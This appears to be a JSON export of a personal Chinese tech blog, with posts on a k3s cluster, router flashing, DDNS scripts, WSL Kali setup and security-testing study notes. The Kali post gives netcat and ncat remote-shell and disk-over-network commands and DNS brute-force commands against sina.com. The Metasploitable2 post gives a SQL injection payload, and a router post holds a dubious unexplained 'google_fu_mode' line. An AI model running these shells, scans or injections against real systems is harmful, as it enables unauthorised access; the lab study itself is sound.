{"posts":[{"title":"K8S中挂载SMB共享作为StorageClass","content":"上周在机顶盒上部署了一套k3s集群，由于两个机顶盒都只有8G的EMMC，所以我想要把刷了DWRT固件的京东云路由器的256G存储空间作为SMB共享给集群使用，从创建SC、创建PVC，部署Deployment，一切都很顺利，但是我部署的两个项目，一个Alist，一个QD框架，在使用localstorage时都能正常运行，而使用SMB共享时都会起不来 查看日志都是sqlite3无法写database.db文件，于是我另外部署了一个sqlite3的Deployment，进入pod排查 touch testfile echo “test” &gt; testfile cat testfile 文件可以正常创建、写入和读取，但使用sqlite3创建data.db、创建表却会报错 sqlite3 data.db create table test (id integer primary key, name text); insert into test (name) values ('Alice'); insert into test (name) values ('Bob'); select * from test; Error: unable to open database &quot;data.db&quot;: unable to open database file 困扰了一周，还是没能解决，现在先使用localstorage，等过段时间再回来看看😓 安装 csi-driver-smb # 添加 Helm 仓库： helm repo add csi-driver-smb https://raw.githubusercontent.com/kubernetes-csi/csi-driver-smb/master/charts helm repo update # 安装 csi-driver-smb： helm install csi-driver-smb csi-driver-smb/csi-driver-smb --namespace kube-system # 检查 csi-smb-controller 和 csi-smb-node 的日志 kubectl logs -n kube-system -l app=csi-smb-controller kubectl logs -n kube-system -l app=csi-smb-node smb-secret.yaml apiVersion: v1 kind: Secret metadata: name: smb-secret namespace: gutf stringData: username: &quot;guest&quot; password: &quot;&quot; smb-storageclass.yaml apiVersion: storage.k8s.io/v1 kind: StorageClass metadata: name: smb provisioner: smb.csi.k8s.io parameters: source: &quot;//192.168.123.1/mmcblk0p24&quot; csi.storage.k8s.io/node-stage-secret-name: &quot;smb-secret&quot; csi.storage.k8s.io/node-stage-secret-namespace: &quot;gutf&quot; csi.storage.k8s.io/node-publish-secret-name: &quot;smb-secret&quot; csi.storage.k8s.io/node-publish-secret-namespace: &quot;gutf&quot; reclaimPolicy: Retain # only retain is supported volumeBindingMode: Immediate mountOptions: - dir_mode=0777 - file_mode=0777 - uid=1000 - gid=1000 - vers=3.0 smb-pvc.yaml apiVersion: v1 kind: Secret metadata: name: smb-secret namespace: gutf stringData: username: &quot;guest&quot; password: &quot;&quot; root@k3s-master-octupos:/opt/testsmb# cat smb-pvc.yaml apiVersion: v1 kind: PersistentVolumeClaim metadata: name: smb-pvc namespace: gutf spec: accessModes: - ReadWriteMany resources: requests: storage: 1Gi storageClassName: smb sqlite3-deployment.yaml apiVersion: apps/v1 kind: Deployment metadata: name: sqlite3-test namespace: gutf spec: replicas: 1 selector: matchLabels: app: sqlite3-test template: metadata: labels: app: sqlite3-test spec: securityContext: fsGroup: 1000 # 设置文件系统组 initContainers: - name: init-permissions image: busybox:1.32.0-uclibc command: [&quot;sh&quot;, &quot;-c&quot;, &quot;chown -R 1000:1000 /data &amp;&amp; chmod -R 777 /data&quot;] volumeMounts: - mountPath: /data name: smb-volume containers: - name: sqlite3 image: keinos/sqlite3 securityContext: runAsUser: 1000 # 设置运行用户 runAsGroup: 1000 # 设置运行组 command: [&quot;sh&quot;, &quot;-c&quot;, &quot;while true; do sleep 3600; done&quot;] volumeMounts: - mountPath: /data name: smb-volume volumes: - name: smb-volume persistentVolumeClaim: claimName: smb-pvc ","link":"https://hellogu.github.io/post/k8s-zhong-gua-zai-smb-gong-xiang-zuo-wei-storageclass/"},{"title":"花生壳DDNS更新shell脚本","content":"前天给京东云路由器刷了这个DWRT，开启了clash，然后DDNS插件获取的ip就变成了代理ip，导致无法正常外网访问我局域网中部署的服务，DDNS插件设置从wan口获取ip一直无法保存，也不知道是插件的BUG还是固件的BUG，没实力排错，只能换个法子实现😅 具体实现办法：在不走代理的服务器上定时运行shell来更新DDNS，并且为了贯彻“能用鼠标点就不要敲键盘”的思想，定时用1panel面板的定时任务实现 以下代码来自chatgpt #!/bin/bash # 假设你已经为以下变量赋了值 USERNAME=&quot;your_username&quot; PASSWORD=&quot;your_password&quot; YOURHOSTNAME=&quot;your_hostname&quot; # 获取当前公网IP地址 WANIP=$(curl -m 5 -sS -X GET http://checkip.dyndns.com | grep -oP 'Current IP Address: \\d+\\.\\d+\\.\\d+\\.\\d+' | cut -d ' ' -f 4) # 检查WANIP变量是否成功获取到IP地址 if [ -z &quot;$WANIP&quot; ]; then echo &quot;Error: Unable to retrieve WAN IP address.&quot; exit 1 fi # 构建请求的URL URL=&quot;http://${USERNAME}:${PASSWORD}@ddns.oray.com/ph/update?hostname=${YOURHOSTNAME}&amp;myip=${WANIP}&quot; # 使用curl发送请求到DDNS提供商，并分别获取HTTP状态码和响应内容 HTTP_STATUS=$(curl -sS -o /dev/stdout -w &quot;%{http_code}&quot; -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;) RESPONSE=$(curl -sS -u &quot;${USERNAME}:${PASSWORD}&quot; &quot;${URL}&quot;) # 输出HTTP状态码和响应内容 echo &quot;HTTP Response Code: $HTTP_STATUS&quot; echo &quot;Response: $RESPONSE&quot; # 从RESPONSE中分离状态码和IP地址 RESPONSE_STATUS=$(echo &quot;$RESPONSE&quot; | awk '{print $1}') IP_ADDRESS=$(echo &quot;$RESPONSE&quot; | awk '{print $2}') HTTP_RESPONSE_IP=$(echo &quot;$RESPONSE&quot; | awk -F'[^0-9]*$' '{print $1}') # 输出分离后的状态码和IP地址 echo &quot;Response Status: $RESPONSE_STATUS&quot; echo &quot;IP Address: $IP_ADDRESS&quot; # 根据返回的响应状态判断操作结果 case &quot;$RESPONSE_STATUS&quot; in &quot;good&quot;) echo &quot;DDNS update successful. Your IP has been updated to: $IP_ADDRESS&quot; ;; &quot;nochg&quot;) echo &quot;DDNS update successful, but no IP change.&quot; ;; # 处理其他响应状态... *) echo &quot;Unexpected response: $RESPONSE_STATUS&quot; ;; esac ","link":"https://hellogu.github.io/post/hua-sheng-ke-ddns-geng-xin-shell-jiao-ben/"},{"title":"在机顶盒上部署一套k3s集群","content":"捡垃圾好多年，攒了好多个机顶盒，都可以运行armbian系统，但每个盒子的磁盘都只有8G，用来跑docker服务没几个就磁盘满了，老是要我来规划哪些个服务跑在哪个机顶盒上，还要在路由器上设置端口转发，十分得不优雅，急需部署一套集群来自动编排这些docker应用，并且便宜的机顶盒如Q5仅需50元一个，以后资源不够了加机也很方便，还能挂载局域网中的共享存储给集群使用，非常的现代化 hostname IP 型号 CPU内存配置 磁盘 Role k3s-master-octupos 192.168.123.3 章鱼星球 8C2G 8G Master k3s-worker-n1 192.168.123.4 斐讯N1 4C2G 8G Worker 1.系统准备 下载章鱼星球和斐讯N1的armbian镜像ophub/amlogic-s9xxx-armbian 使用balenaEtcher写入U盘 机顶盒插入U盘，上电开机，如果机顶盒中已经是armbian或openwrt系统会默认从U盘启动，如果是安卓系统，可以安装Reboot to liberelec（需要root权限）从U盘启动 执行命令刷入armbian系统armbian-install，刷写完输入命令poweroff关机，拔出U盘重新上电 2.部署k3s Master节点 参考geekhour的教程 # 安装k3s的master节点 curl -sfL https://get.k3s.io | sh - # 如果安装失败可以使用ranher的镜像源来安装 curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh - # 安装完成后查看集群状态 kubectl get nodes # 查看token，在下一步创建worker节点时需要认证 cat /var/lib/rancher/k3s/server/node-token 3.部署worker节点 需要用到token和Master节点的ip，在geekhour的教程中部署了多个worker节点，所以将token和ip写入到了环境变量中，利用for循环给多个worker进行部署，我暂时只有一个worker，直接输入token和ip也可以 export MASTER_IP=192.168.123.3 export TOKEN=部署Master节点时获取的token bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn K3S_URL=\\&quot;https://$MASTER_IP:6443\\&quot; K3S_TOKEN=\\&quot;$TOKEN\\&quot; sh -&quot; 此时再去Master节点上执行kubectl get node可以看到集群一主一从两个节点已经ready 但是在worker节点上执行kubectl get node出现了报错 4.解决worker节点无法执行kubectl命令 询问chatgpt，给出的解决办法如下： 确认worker节点的kubectl配置kubectl config view 从kubectl config view的输出来看，worker节点的kubectl配置为空，需要从master节点获取一份正确的配置，在 K3s 集群中，默认的 Kubeconfig 文件位于 /etc/rancher/k3s/k3s.yaml。我需要将这个文件复制到你的用户目录中，并设置 KUBECONFIG 环境变量指向它。 复制k3s.yaml到worker节点mkdir -p ~/.kube scp root@192.168.123.3:/etc/rancher/k3s/k3s.yaml ~/.kube/config 修改文件权限 确保kubectl可以访问这个文件，设置正确的文件权限：chmod 600 ~/.kube/config 设置KUBECONFIG环境变量 确保你的KUBECONFIG环境变量指向这个配置文件。你可以在终端中临时设置它，或者将其添加到你的shell配置文件（例如.bashrc或.zshrc）中：export KUBECONFIG=$HOME/.kube/config 如果你希望这个设置在每次登录时都生效，可以将上面的命令添加到你的shell配置文件中。例如，编辑.bashrc文件：echo 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc source ~/.bashrc 验证配置 现在你可以验证kubectl是否已经正确配置并能够连接到你的K3s集群。 5.安装Helm Helm安装在任何可以访问 Kubernetes 集群的机器上，不一定要安装在Master节点上 执行命令curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash 6.安装cert-manager # 添加Helm Chart仓库 helm repo add &quot;stable&quot; &quot;https://charts.helm.sh/stable&quot; --force-update helm repo add rancher-stable https://releases.rancher.com/server-charts/stable # 定义一个Kubernetes名称空间，Chart创建的资源应该安装在这个名称空间中：cattle-system kubectl create namespace cattle-system # 安装cert-manager kubectl apply -f https://github.com/cert-manager/cert-manager/releases/download/v1.14.5/cert-manager.crds.yaml # Add the Jetstack Helm repository helm repo add jetstack https://charts.jetstack.io # Update your local Helm chart repository cache helm repo update # Install the cert-manager Helm chart helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace master点也报了这个连接超时的错，再把步骤4中chatgpt给出的解决办法在master节点也操作一遍 mkdir -p $HOME/.kube sudo cp /etc/rancher/k3s/k3s.yaml $HOME/.kube/config sudo chown $(id -u):$(id -g) $HOME/.kube/config export KUBECONFIG=$HOME/.kube/config echo 'export KUBECONFIG=$HOME/.kube/config' &gt;&gt; ~/.bashrc source ~/.bashrc 重新安装cert-manager helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace 又报了个等待超时的错，但是查看cert-manager命名空间下的资源，都挺健康，可能是由于机顶盒性能太弱起来的太慢导致超时，所以我直接进行下一步 重装完k3s 1.28版本后又试了一遍，应该确实是因为pod启动得慢了 7.安装Rancher helm install rancher rancher-stable/rancher --namespace cattle-system --set hostname=rancher.tianfeng.com 蚌埠住了😰竟然要版本低于1.29.0 8.卸载k3s，重装低版本 按照官方文档来操作 可以先停止k3s服务再进行卸载 sudo systemctl stop k3s sudo systemctl disable k3s 重新安装低于1.29的k3s，这里我使用最后一个1.28版本 # 重新安装master节点的k3s curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 sh - worker节点： export MASTER_IP=192.168.123.3 export TOKEN=部署Master节点时获取的token bash -c &quot;curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn INSTALL_K3S_VERSION=v1.28.9+k3s1 K3S_URL=\\&quot;https://$MASTER_IP:6443\\&quot; K3S_TOKEN=\\&quot;$TOKEN\\&quot; sh -&quot; 9使用portainer 机顶盒性能太弱，部署rancher一直无法正常启动，换成轻量化的portainer来管理 ","link":"https://hellogu.github.io/post/zai-ji-ding-he-shang-bu-shu-yi-tao-k3s-ji-qun/"},{"title":"京东云路由器AX1800Pro(亚瑟)刷QWRT","content":"苏州联通开始封禁家庭宽带PCDN了，3月底给我上传限制到5M，微信视频都发不出去，联系了装机小哥签了个保证书才给我恢复😰还好我的几台京东云路由器早已回本，既然不能赚京豆了，就直接刷第三方系统吧。 开始我是想要刷个iStoreOS的，毕竟我这台京东云AX1800PRO带256G的EMMC，想尝试下iStoreOS做轻NAS，但是按照网友给出的教程和固件，iStoreOS始终无法刷入，自己又没实力排错，只能默默的换个固件刷😅还好可以刷大雕的QWRT固件 简单记录一下刷机过程，方便后续继续折腾 准备工作 揭开底部胶垫，拧出5颗螺丝 取下底盖，拧出4颗螺丝 撬开顶部上盖，拧出2颗螺丝 捏住外壳，使外壳微微形变与网口分离，以便抽出主板 刷入uboot 修改网卡IP为192.168.10.1（或其他，只要与下面步骤中命令中的ip一致） 使用Tftpd64架设tftp服务器，放入u-boot.mbn文件，server interfaces选择192.168.10.1 使用CH340串口工具连接主板上的TTL口GND-G,T-R,R-T 打开MobaXterm新建串口连接，选择CH340对应的COM口，波特率位115200 路由器插电开机，在串口连接窗口看到提示时按enter键打断启动（插电后一直按enter键就行了），进入IPQ6018#命令界面 输入命令tftpboot u-boot.mbn 从 TFTP 服务器下载名为 u-boot.mbn 的文件到设备上 输入命令flash 0:APPSBL &amp;&amp; flash 0:APPSBL_1刷入uboot分区 刷入固件 刷入uboot之后就可以随意刷固件了（我浅显的理解uboot分区类似安卓的recovery分区，通过启动到recovery分区中可以进行其他分区的刷写操作🤣） 按住主板上的reset键再插入路由器电源，等待呼吸灯红色闪烁5下变为蓝色（如果此时还连着TTL的话可以看到TTL界面有对应跳动5秒后打印出“http server is ready”） 电脑IP设置为192.168.1.15（与192.168.1.1同网段即可） 浏览器打开192.168.1.1选择固件上传，QWRT固件刷写完成后路由器会自动重启，呼吸灯变绿 QWRT默认管理页面位192.168.1.1，root:password 开启神秘东方插件echo 0xDEADBEEF &gt; /etc/config/google_fu_mode 其他 更改openwrt软路由后台管理地址后，发现TTYD终端无法连接，显示已拒绝连接 解决方法:SSH进后台，vi /etc/init.d/ttyd将${interface:+-i $interface} \\这行注释，保存后重启 扩容软件包分区，刷完DWRT软件包分区只有8MB，需要扩容一下 # 先将gpt.bin上传到/tmp cd /tmp dd if=gpt.bin of=/dev/mmcblk0 bs=512 count=34 dd if=/dev/zero of=/dev/mmcblk0p2 dd if=/dev/zero of=/dev/mmcblk0p3 sync # 操作完后路由器断电，重新进入uboot刷写factory.bin固件 扩容软件分区之后有200G的剩余空间没有挂载，需要手动分区一下# 先lsblk查看下磁盘，没有lsblk的话去软件包中搜索安装 lsblk # 使用cddisk分区，根据提示操作 cfdisk /dev/mmcblk0 # 创建出来024分区，格式化 mkfs.ext4 /dev/mmcblk0p24 # 挂载 mount /dev/mmcblk0p24 /mnt/mmcblk0p24 # 然后去web-网络存储-网络共享中添加共享 参考链接 纯自用：京东云无线宝亚瑟AX1800Pro扩容软件包空间，刷大分区GPT文件 木子のBlog 软路由再见-0成本狗东亚瑟AX1800 pro刷iStoreOS教程 ","link":"https://hellogu.github.io/post/jing-dong-yun-lu-you-qi-shua-qwrt/"},{"title":"小爱音箱接入chatgpt","content":"这是一个在github上看到的开源项目，点击项目地址给作者一个大大的Star吧 部署过程 pip install -U miservice_fork -i https://pypi.doubanio.com/simple/ export MI_USER=181******** export MI_PASS=************ micli list 记录did 目录结构 config.json： 设置关键词“请”，跟小爱同学对话时说“介绍一下你自己”小爱回答，说“请介绍一下你自己”小爱同学会调用chatgpt回答（关键词触发，将对话内容发给gpt，传回小爱同学用TTS朗读） hardware：设备型号，在小爱音箱背面或者底部，如果没有则使用micli mina查看 { &quot;openai_key&quot;:&quot;&quot;, &quot;api_base&quot;:&quot;&quot;, &quot;openai_api_model&quot;:&quot;&quot;, &quot;hardware&quot;:&quot;L07A&quot;, &quot;mute_xiaoai&quot;: true, &quot;account&quot;: &quot;&quot;, &quot;password&quot;:&quot;&quot;, &quot;mi_did&quot;:&quot;&quot;, &quot;bot&quot;: &quot;chatgptapi&quot;, &quot;tts&quot;: &quot;mi&quot;, &quot;prompt&quot;: &quot;你的名字叫小爱GPT，是一个人工智能助手，你的回答尽量简明扼要，回答总数不能超过150字。&quot;, &quot;keyword&quot;: [ &quot;请&quot; ], &quot;stream&quot;: true docker-compose.yaml version: '3.8' services: xiaogpt: image: yihong0618/xiaogpt volumes: - ./config:/config ports: - &quot;9527:9527&quot; restart: always command: --config=/config/config.json ","link":"https://hellogu.github.io/post/xiao-ai-yin-xiang-jie-ru-chatgpt/"},{"title":"苑房宏Kali笔记","content":" 虽然之前做过一些web安全测试相关的工作，但大都是像Nessus之类的安全扫描工具的使用，在手工发掘漏洞这块能力比较欠缺，另外像wireshark、burpsuite等工具仅仅学习了最基础的抓包和代理的用法，对于burpsuite的一些第三方插件也接触比较少，于是想要系统的学习一下网络安全测试这块，在52pj上找到了苑房宏的《Kali Linux安全测试》177讲，不过教程是2015年的了，课程中讲到的一些工具有的已经停止维护，有的版本更新之后使用命令发生了改变，所以在这篇笔记中记录一下，方便自己后续的使用。 kali基础配置 开启SSH登录 编辑ssh文件，取消PermitRootLogin和PasswordAuthentication的注释，并改为yes； 重启SSH服务，/etc/init.d/ssh restart 或者service ssh restart重启，/etc/init.d/ssh status或者service ssh status查看状态是否正常运行 开启ssh服务开机自启动，查看开启状态，update-rc.d ssh enable或者systemctl enable ssh开机自启动vi /etc/ssh/sshd_config #vi模式下输入'/关键词'回车进行搜索，按n查找下一个 service ssh restart update-rc.d ssh enable kali工具 nc&amp;ncat 传输文本信息 主机A：nc -l -p 4444 开启一个监听服务，端口4444 主机B：nc –nv 1.1.1.1 4444 连接主机A的4444端口 传输⽂件 A：nc -lp 333 &gt; 1.mp4 B：nc -nv 1.1.1.1 333 &lt; 1.mp4 –q 1 -q：传输完成1s后断开连接 或者 A：nc -q 1 -lp 333 &lt; a.mp4 B： nc -nv 1.1.1.1 333 &gt; 2.mp4 nc工具本身不支持加密连接，如果需要加密传输，可以先把要传输的内容通过mcrypt加密再明文传输 A：nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 B： mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1 mcrypt: 调用mcrypt加密工具 flush: 清除加密工具的内部状态 Fbqd: 设置特定的选项，包括使用文件输入和输出、启用调试模式以及启用详细输出 a rijndael-256: 使用Rijndael-256算法进行加密 m ecb: 使用ECB模式进行加密，ECB是一种基本的加密模式，不适合处理大量数据 流媒体服务 A： cat 1.mp4 | nc -lp 333 将mp4文件cat出来通过管道传入nc B： 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -主机B需要使用支持命令模式的播放器比如mplayer mplayer: 调用MPlayer媒体播放器 vo x11: 指定视频输出设备为X11（X Window System），即在X窗口系统中播放视频 cache 3000: 设置缓存大小为3000 KB，这可以帮助减少视频播放时的卡顿和延迟 -: 表示要播放的视频文件是通过标准输入传输的，而不是通过文件名指定的 端口扫描 nc -nvz 1.1.1.1 1-65535 -nvz: 设置netcat为静默模式（不显示任何输出）、启用数字格式（显示IP地址和端口号）、以及使用zero I/O模式（仅扫描端口，不发送任何数据） nc –vnzu 1.1.1.1 1-1024 -u: 使用UDP协议 远程克隆硬盘 A： nc -lp 333 | dd of=/dev/sda B： dd if=/dev/sda | nc -nv 1.1.1.1 333 –q 1 dd: 是一个用于数据转换和复制的命令行工具 if=/dev/sda: 指定输入文件（input file）为/dev/sda，即源磁盘/dev/sda of=/dev/sdb: 指定输出文件（output file）为/dev/sdb，即目标磁盘/dev/sdb 将B主机的/dev/sda克隆出来通过nc传到A主机的/dev/sda 远程控制 A：nc -lp 333 -c bash -c bash: 指定nc接受连接后要执行的命令，这里是执行bash命令（即启动一个bash shell） B：nc 1.1.1.1 333 或者 A：nc -lp 333 B：nc 1.1.1.1 333 -c bash 指定连接后要执行的命令，即bash shell ncat A：ncat -c bash --allow 192.168.123.100 -vnl 333 --ssl -c bash: 在连接建立后，执行 bash 命令（即启动一个交互式的 Bash Shell）。 --allow 192.168.123.100: 限制连接的来源 IP 地址为 192.168.123.100。只有来自该 IP 地址的连接才会被接受。 -vnl 333: 监听本地端口 333，等待连接。 --ssl: 使用 SSL/TLS 加密来保护连接。 B：ncat -nv 192.168.123.157 333 --ssl -nv: 使用详细输出模式，显示更多连接信息。 192.168.123.157: 要连接的目标 IP 地址。 333: 目标主机上要连接的端口。 --ssl: 使用 SSL/TLS 加密来保护连接。 wireshark&amp;tcpdump wireshark的示例cap包 三次握手： 客户端发送一个SYN数据包给服务器，表示请求建立连接。 服务器收到SYN数据包后，回复一个SYN+ACK数据包给客户端，表示同意建立连接。 客户端再发送一个ACK数据包给服务器，表示连接建立成功。 这样就完成了TCP的三次握手过程，连接建立成功。 四次挥手，用于终止连接。 客户端发送一个FIN数据包给服务器，表示要关闭连接。 服务器收到FIN数据包后，回复一个ACK数据包给客户端，表示收到关闭请求。 服务器再发送一个FIN数据包给客户端，表示自己也要关闭连接。 客户端收到FIN数据包后，回复一个ACK数据包给服务器，表示同意关闭连接。 tcpdump -A -n 'tcp[13] = 24' -r http.cap 使用tcpdump读取数据包 -A: 这个选项告诉tcpdump以ASCII格式显示数据包的内容，而不是以十六进制格式显示。 -n: 这个选项告诉tcpdump不要将网络地址和端口转换为主机名和服务名，而是以数字形式显示。 'tcp[13] = 24': 这部分是过滤器，用于指定要捕获的数据包的条件。在这里，tcp[13] = 24表示过滤出TCP标志字段的第13个字节（即第一个字节为0）的值为24的数据包。在TCP标志字段中，24表示SYN和ACK标志同时被设置，这通常代表一个TCP连接的建立阶段。 在TCP标志字段中，第13个字节（从0开始计数）通常用来表示TCP头部中的标志位。TCP头部的标志位共有6个，它们分别是： URG（紧急指针）：用来指示紧急数据。 ACK（确认）：用来确认收到的数据。 PSH（推送）：用来指示接收方尽快将数据交给应用层。 RST（复位）：用来强制关闭连接。 SYN（同步）：用来建立连接。 FIN（结束）：用来释放连接。 这些标志位被存储在TCP头部的第13个字节中，每个标志位占1个比特位。通过设置或清除这些标志位，TCP控制连接的建立、终止和数据传输过程。 CWR（Congestion Window Reduced）和ECE（Explicit Congestion Notification Echo）是TCP头部中的两个额外的标志位，用于传输控制和拥塞控制。 CWR（Congestion Window Reduced）：CWR标志位用于指示发送方已经收到了一个带有拥塞通知（Congestion Notification）的数据包，并已经减小了发送窗口（Congestion Window）。这个标志位通常在TCP连接中用于拥塞控制。 ECE（Explicit Congestion Notification Echo）：ECE标志位用于指示接收方收到了来自网络的拥塞通知。当路由器或网络设备检测到网络拥塞时，会向数据包中添加拥塞通知，接收方收到带有ECE标志位的数据包后，会通知发送方网络出现了拥塞。这有助于发送方调整发送速率以减轻网络拥塞。 这两个标志位通常在TCP连接中用于拥塞控制和网络拥塞的处理，帮助TCP协议更有效地适应网络状况并提高网络性能。 DNS信息收集 nslookup，dig和host都是用于进行DNS查询的命令行工具，用于查找域名对应的IP地址或反向查找IP地址对应的域名 nslookup www.sina.com 查询域名www.sina.com对应的IP地址和其他相关信息。 nslookup -type=ns example.com 156.154.70.22 指定的域名服务器（156.154.70.22）查询域名example.com的NS记录（Name Server记录）。 dig @8.8.8.8 www.sina.com mx 指定要查询的DNS服务器（8.8.8.8），查询域名www.sina.com的MX记录（Mail Exchange记录）。 dig www.sina.com any 查询域名www.sina.com的所有记录类型（包括A、MX、NS等）。 dig +noall +answer -x 8.8.8.8 进行反向查询，通过IP地址（8.8.8.8）查找对应的域名。 dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com 查询指定DNS服务器（ns3.dnsv4.com）的BIND版本信息。（通常会被拒绝） dig +trace example.com 执行DNS追踪，显示从根域名服务器到最终目标域名的DNS查询路径。 dig @ns1.example.com example.com axfr 在指定的域名服务器（ns1.example.com）上执行区域传送（AXFR），获取域名example.com的完整DNS记录。（通常会被拒绝） host -T -l sina.com 8.8.8.8 在指定的DNS服务器（8.8.8.8）上执行枚举（枚举所有记录）查询，列出sina.com域名的所有记录。 DNS字典爆破 由于通过区域传送（AXFR）获取域名下的完整DNS记录通常会被拒绝，攻击者会使用DNS字典爆破来探测目标域名下的子域名。通过使用一个包含大量可能的子域名列表的字典文件，尝试枚举目标域名的所有可能子域名，以便发现隐藏在其后的资源或服务。常用工具，如&quot;fierce&quot;、&quot;sublist3r&quot;等，指定一个字典文件（包含可能的子域名列表）并指定目标域名，然后工具将自动尝试查询每个子域名的DNS记录，以确定哪些子域名是有效的。 fierce等工具安装后都会自带一些字典文件，使用dpkg -L fierce 来列出相关文件查找字典文件的路径 fierce --dns-servers 223.5.5.5 --domain sina.com.cn --subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt --dns-servers 223.5.5.5: 这个参数指定了要使用的DNS服务器的IP地址，这里是223.5.5.5。 --domain sina.com.cn: 这个参数指定了目标域名，即要进行字典爆破的域名是sina.com.cn。 --subdomain-file /usr/lib/python3/dist-packages/fierce/lists/5000.txt: 这个参数指定了包含要用于字典爆破的子域名列表的文件路径，这里是/usr/lib/python3/dist-packages/fierce/lists/5000.txt。 atk6-dnsdict6 -d4 -t 16 -x sina.com atk6-dnsdict6速度更快 -d4 表示使用 IPv4 进行查询 -t 16 表示设置 DNS 查询的超时时间为 16 毫秒 -x 则表示使用递归查询。 其他类似工具 dnsenum dnsmap dnsrecon ","link":"https://hellogu.github.io/post/yuan-fang-hong-kali-bi-ji/"},{"title":"Metasploitable2靶场部署","content":"Metasploitable2是一个专门设计用于安全测试和漏洞利用的虚拟机镜像。它由Rapid7公司开发，旨在提供一个用于练习渗透测试和漏洞利用的环境，帮助安全专业人员和研究人员学习和实践攻击技术。Metasploitable2基于Ubuntu Linux操作系统，并预装了大量易受攻击的漏洞和弱点，包括常见的服务如FTP、SSH、Telnet、Web服务器、数据库等。通过使用Metasploitable2，安全专业人员可以模拟真实世界中的攻击场景，练习渗透测试和漏洞利用技术，了解攻击者可能利用的漏洞和弱点，提高安全防护意识并加强网络安全防御能力。 1.下载安装 Step.1 点击下载 Step.2.解压后导入VMware 解压后是VMware格式的虚拟机文件，没有找到Hyper-V的版本 Step.3.修改配置文件 导入VMware后启动虚拟机，用户名和密码都是msfadmin 使用ip a命令查看ip地址，浏览器打开http://ip/mutillidae/ 此时进入OWASP TOP 10 进行练习会报错，原因是/var/www/mutillidae/config.inc配置文件中的dbname不正确 执行命令sudo vi /var/www/mutillidae/config.inc将dbname修改为owasp10 修改后wq!保存并退出，再进入OWASP TOP 10 -&gt; A1 Injection -&gt; SQLi-Extract Data -&gt; User Info进行第一条SQL注入练习 ' or '1' # 第一个单引号将sql语句前面截断，#号将sql语句后面注释，中间 or '1' 恒成立，实现查询出所有用户信息，完整的sql语句为SELECT * FROM accounts WHERE username='' or '1' #' AND password=''（不过2024年了，应该不会有网站出现这种简单的注入漏洞了吧🤓） ","link":"https://hellogu.github.io/post/metasploitable2/"},{"title":"WSL安装Kali","content":"在WSL2中部署Kali Linux 1.安装 Kali官方文档进行安装 在 Step.5 遇到了报错 参考CSDN文章解决 2.安装桌面参考Kali官方文档 # 启动 cd ~ kex kex stop # 关闭 kex --win -s # 窗口模式 kex --sl -s # 无缝模式 kex --esm --sound # windows rdp 远程模式 3.卸载重装 先在windows应用管理中卸载kali-linux 然后在wsl中取消注册kali-linux wsl --unregister kali-linux 最后在应用商店重装kali-linux(步骤1中的 Step.5 ) 4.WSL重启 wsl -v -l #列出所有wsl发行版和状态 wsl --shutdown #立即终止所有正在运行的分发版和 WSL 2 wsl --terminate kali-linux #终止指定发行版 wsl -d kali-linux # 运行指定的分发版 5.一个诡异的问题 在windows开始菜单中打开kali linux输入kex --win -s能正常启动kali桌面，在mobaxterm中连接kali后再输入kex --win -s，出现的kali桌面没有任务栏😂 6.kex无缝模式打不开 尝试了好久，没仔细看报错信息“Unable to find Win-KeX server (SL) running on host: 192.168.123.1”，为了让kali能科学上网，使用windows中的clash，我在.wslconfig中设置了networkingMode=mirrored，所以这里的host ip变成了windows中的网关ip(我的路由器地址)，正常情况host ip应该是windows的ip 7.设置中科大源 sudo sed -i '1i\\deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib\\n\\ deb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib' /etc/apt/sources.list 8.设置WSL网络为镜像或桥接模式 参考文档 9.安装Kali工具包 安装标准工具包 sudo apt install -y kali-linux-default 安装大工具包（大概7 8G） sudo apt install -y kali-linux-large 10.apt install卡在Setting up libc6:amd64 (2.37-14) ... 安装hashcat时卡在了Setting up libc6，process 0%，笔记本风扇一直高转，重装WSL也没有解决，在github找到了解决方法 ","link":"https://hellogu.github.io/post/wsl-an-zhuang-kali/"},{"title":"太强辣， GeekHour课程笔记","content":" 最近刷B站发现了这个宝藏UP主，看了一遍他的linux、K8S等教程，怎么说呢，感觉他就像我的同班学霸，虽然在之前的工作中跟他一样学习了这些东西，但看一遍他的笔记，期末能提高10分👻有一种高密度的知识流进大脑的感觉，所以我要把他的笔记全部抄一遍！放到这个文档中供自己随时查看，嘻嘻。 LinuxCheatSheet Kubernetes-Cheat-Sheet DockerCheatSheet ","link":"https://hellogu.github.io/post/tai-qiang-la-geekhour/"},{"title":"安卓微信小程序抓包","content":"一直在使用的qd签到框架，最近发现某个微信小程序的自动签到任务出错了，看了一下，作者已经发布了新的签到模板，但是模板的设置由之前的只需要手机号变成了需要手机号和微信小程序的cookie了，记录一下 iPhone的抓包比较简单，Appstore中搜索软件“stream”下载安装后信任证书就可以了 安卓手机的话可以使用小黄鸟在手机上直接抓包，或者使用Burpsuite/fiddler/Charles等软件配置好代理后可以抓取http请求，抓取https请求的话需要配置证书 本文主要记录一下安卓上的实现方式 步骤 前置步骤：手机需要获取root权限并安装好magisk软件-kitsune版,没有的话可以使用雷电模拟器，参考文章雷电安装Magisk及Delta(狐狸面具)教程 Burpsuite配置代理，导出证书 使用openssl工具修改证书格式，导入手机 手机安装movecert magisk模块，将导入的用户证书转移成系统证书使用MT管理器直接将证书文件复制到系统证书目录 手机配置局域网代理开始抓包 具体操作步骤 